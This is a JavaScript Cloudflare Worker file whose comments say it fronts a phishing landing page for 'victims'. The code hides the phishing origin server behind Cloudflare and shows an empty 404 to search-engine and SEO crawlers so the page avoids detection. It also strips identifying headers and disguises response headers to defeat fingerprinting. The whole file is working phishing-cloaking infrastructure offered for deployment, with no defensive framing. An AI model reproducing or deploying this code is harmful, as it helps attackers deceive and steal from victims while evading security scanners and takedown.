// Cloudflare Worker — Reverse proxy for phishing landing page
// Deploy: npx wrangler deploy
// The origin server IP is never exposed to victims.
// Victims see: your-worker.workers.dev (Cloudflare TLS cert, Cloudflare IP)
// Origin: hidden behind Cloudflare's edge network

export default {
    async fetch(request, env, ctx) {
        const ORIGIN = env.ORIGIN_URL || 'https://YOUR_ORIGIN_IP:9090';
        const url = new URL(request.url);

        // Bot blocking — return empty 404 to known crawlers
        const botPatterns = /Googlebot|Bingbot|Baiduspider|DuckDuckBot|YandexBot|Slurp|Facebot|Twitterbot|PetalBot|Applebot|AhrefsBot|SemrushBot|DotBot|Bytespider/i;
        if (botPatterns.test(request.headers.get('User-Agent') || '')) {
            return new Response('<html><body></body></html>', {
                status: 404,
                headers: { 'Content-Type': 'text/html' },
            });
        }

        // Build origin URL — preserve path, query, and fragment
        const originUrl = new URL(ORIGIN);
        originUrl.pathname = url.pathname;
        originUrl.search = url.search;
        originUrl.hash = url.hash; // Critical: pass encrypted fragment through

        const modifiedRequest = new Request(originUrl, {
            method: request.method,
            headers: request.headers,
            body: request.body,
            redirect: 'follow',
        });

        // Strip Cloudflare-specific headers before forwarding
        modifiedRequest.headers.delete('CF-Connecting-IP');
        modifiedRequest.headers.delete('CF-IPCountry');
        modifiedRequest.headers.delete('CF-Ray');
        modifiedRequest.headers.delete('CF-Visitor');

        const response = await fetch(modifiedRequest);

        // Replace origin response headers to avoid Go/OS fingerprinting
        const newHeaders = new Headers(response.headers);
        newHeaders.set('Server', 'cloudflare');
        newHeaders.delete('X-Powered-By');
        newHeaders.delete('X-Content-Type-Options');
        newHeaders.delete('X-Frame-Options');

        return new Response(response.body, {
            status: response.status,
            statusText: response.statusText,
            headers: newHeaders,
        });
    },
};
